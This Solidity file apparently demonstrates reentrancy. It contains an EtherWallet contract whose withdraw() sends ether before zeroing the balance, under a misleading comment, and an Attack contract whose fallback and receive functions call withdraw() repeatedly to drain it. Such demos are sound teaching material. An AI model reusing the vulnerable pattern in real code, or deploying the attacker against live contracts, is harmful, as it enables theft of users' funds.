// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

contract EtherWallet{
    mapping (address => uint256) userBalance;

    event depositeLog(address indexed sender , uint256 value , uint256 balance);
    event withdrawLog(address indexed sender , uint256 value);

    constructor()payable {}

    function deposite() public payable  {
        require(msg.value > 0, "value must be bigger than zero");
        userBalance[msg.sender] += msg.value;
        emit depositeLog(msg.sender, msg.value , userBalance[msg.sender]);
    }

    function withdraw() public {
        require(userBalance[msg.sender] > 0, "insufficient ballance");
        emit withdrawLog(msg.sender , userBalance[msg.sender]);
        (bool success, ) = msg.sender.call{value:userBalance[msg.sender]}("");
        require(success, "withdraw assets failed");
        // this is a hack to make sure the contract balance is 0 after withdraw

        userBalance[msg.sender] = 0;
    }

    function getUserBalance() public view returns (uint256) {
        return userBalance[msg.sender];
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/// reentrancy attack contract

contract Attack{

    EtherWallet public  wallet;

    constructor(address _walletAddress) {
        wallet = EtherWallet(_walletAddress);
    }

    fallback() external payable { 
      if(address(wallet).balance >= 1 ether){
        wallet.withdraw();
        }
    }

     receive() external payable {
        if(address(wallet).balance >= 1 ether){
        wallet.withdraw();
        }
     }

    function attack() external  payable  {
        require(msg.value >=1 ether, "value is not enough");
        wallet.deposite{value:1 ether}();
        wallet.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance; 
    }

    function withdrawal() public payable {
        require(address(this).balance > 0, "insufficient ballance");
        
        (bool success, ) = msg.sender.call{value:address(this).balance}("");
        require(success, "withdraw assets failed");  
    }

    
   
}